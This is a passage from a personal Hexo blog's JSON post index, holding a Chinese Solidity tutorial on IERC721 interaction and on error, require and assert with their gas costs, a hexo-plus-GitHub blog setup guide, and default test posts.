需要知道它具体代码实现，就可以与它交互。\n无聊猿BAYC属于ERC721代币，实现了IERC721接口的功能。我们不需要知道它的源代码，只需知道它的合约地址，用IERC721接口就可以与它交互，比如用balanceOf()来查询某个地址的BAYC余额，用safeTransferFrom()来转账BAYC。\ncontract interactBAYC {\n    // 利用BAYC地址创建接口合约变量（ETH主网）\n    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);\n\n    // 通过接口调用BAYC的balanceOf()查询持仓量\n    function balanceOfBAYC(address owner) external view returns (uint256 balance){\n        return BAYC.balanceOf(owner);\n    }\n\n    // 通过接口调用BAYC的safeTransferFrom()安全转账\n    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external{\n        BAYC.safeTransferFrom(from, to, tokenId);\n    }\n}\n\n15.异常\n写智能合约经常会出bug，solidity中的异常命令帮助我们debug。\nError\nerror是solidity 0.8版本新加的内容，方便且高效（省gas）地向用户解释操作失败的原因。人们可以在contract之外定义异常。下面，我们定义一个TransferNotOwner异常，当用户不是代币owner的时候尝试转账，会抛出错误：\nerror TransferNotOwner(); // 自定义error\n\n在执行当中，error必须搭配revert（回退）命令使用。\n    function transferOwner1(uint256 tokenId, address newOwner) public {\n        if(_owners[tokenId] != msg.sender){\n            revert TransferNotOwner();\n        }\n        _owners[tokenId] = newOwner;\n    }\n\n我们定义了一个transferOwner1()函数，它会检查代币的owner是不是发起人，如果不是，就会抛出TransferNotOwner异常；如果是的话，就会转账。\nRequire\nrequire命令是solidity 0.8版本之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是gas随着描述异常的字符串长度增加，比error命令要高。使用方法：require(检查条件，\"异常的描述\")，当检查条件不成立的时候，就会抛出异常。\n我们用require命令重写一下上面的transferOwner函数：\n    function transferOwner2(uint256 tokenId, address newOwner) public {\n        require(_owners[tokenId] == msg.sender, \"Transfer Not Owner\");\n        _owners[tokenId] = newOwner;\n    }\n\n贴个在remix上验证的例子吧\n1.输入任意uint256数字和非0地址，调用transferOwner1，也就是error方法，控制台抛出了异常并显示我们自定义的TransferNotOwner。\n\n2.输入任意uint256数字和非0地址，调用transferOwner2，也就是require方法，控制台抛出了异常并打印出require中的字符串。\n\n3.输入任意uint256数字和非0地址，调用transferOwner3，也就是assert方法，控制台只抛出了异常。\n\nAssert\nassert命令一般用于程序员写程序debug，因为它不能解释抛出异常的原因（比require少个字符串）。它的用法很简单，assert(检查条件），当检查条件不成立的时候，就会抛出异常。\n我们用assert命令重写一下上面的transferOwner函数：\n    function transferOwner3(uint256 tokenId, address newOwner) public {\n        assert(_owners[tokenId] == msg.sender);\n        _owners[tokenId] = newOwner;\n    }\n\n三种方法的gas比较\n我们比较一下三种抛出异常的gas消耗，通过remix控制台的Debug按钮，能查到每次函数调用的gas消耗分别如下：\n\n\nerror方法gas消耗：24445\n\n\nrequire方法gas消耗：24743\n\n\nassert方法gas消耗：24446\n\n\n我们可以看到，error方法gas最少，其次是assert，require方法消耗gas最多！因此，error既可以告知用户抛出异常的原因，又能省gas，大家要多用！（注意，由于部署测试时间的不同，每个函数的gas消耗会有所不同，但是比较结果会是一致的。）\n","slug":"solidity入门","date":"2022-11-26T16:55:02.000Z","categories_index":"","tags_index":"solidity","author_index":"cocoZ"},{"id":"4a8c6c67f0d77f1d7a087ca184ac4b68","title":"hexo+github搭建个人博客","content":"搭建个人博客（hexo+github）\n准备工作安装git、安装node.js、还有npm啥的（在看到任务前就装好了的）\n在github上创建仓库\n仓库名字要和用户名一样！！！\n（github pages等一会儿就出来了）\n\n安装hexo\n桌面创建一个文件夹，在文件夹目录下打开git bash here\n\n安装hexo\nnpm install -g hexo-cli\n查看版本\nhexo -v\n初始化hexo、\nhexo init\n生成本地的hexo页面\nhexo s\n输入hexo g生成静态网站\n输入hexo s，然后浏览器打开localhost:4000，就可以本地访问了（Ctrl+c退出）\n连接GitHub与本地\n绑定个密钥：生成SSH Keys\nssh-keygen -t rsa -C \"你的邮箱地址\"\n在C/用户/16017/.ssh目录下打开这个，复制\n\n打开github的总setting，添加SSH Keys\n\n在目录下打开git bash here，输入以下命令\ngit config --global user.name cocoGenZ\ngit config --global user.email 160760796@qq.com\n打开博客根目录下的_config.yml文件，修改最后一行的配置\n  type: git\n  repository: https://github.com/cocoGenZ/cocoGenZ.github.io.git\n  branch: main\n\nTip:上面的repository在GitHub里面复制HTTPS那个\n\n安装一键部署插件\ncnpm install hexo-deployer-git --save(不知道为什么有这个save的我安装不了，就另外装了个cnpm来安装)（更新完就ok了`npm -g install npm@latest）\n分别输入一下三条命令\nhexo clean   #清除缓存文件 db.json 和已生成的静态文件 public\nhexo g       #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写)\nhexo d       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)\n最后访问博客的地址就可以啦https://cocogenz.github.io/\n\n改个主题吧\n安装一个yarn（命令行就能装，用npm来装）\nyarn add hexo-theme-aurora\n\n改改参数\n\n关于上传图片显示的问题\n将图片上传到网上，再用markdown引用\nhttps://sm.ms/\n这个网址很方便\n","slug":"hexo-github搭建个人博客","date":"2022-11-21T14:10:57.000Z","categories_index":"","tags_index":"博客","author_index":"cocoZ"},{"id":"7b9812fe6cbf2aba598dcdf2de807daf","title":"Test","content":"第一次搭博客，浅浅做个测试\n","slug":"Test","date":"2022-11-15T03:55:53.000Z","categories_index":"","tags_index":"","author_index":"cocoZ"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick Start\nCreate a new post\n$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server\n$ hexo server\n\nMore info: Server\nGenerate static files\n$ hexo generate\n\nMore info: Generating\nDeploy to remote sites\n$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2022-11-15T02:54:10.513Z","categories_index":"","tags_index":"","author_index":"cocoZ"}]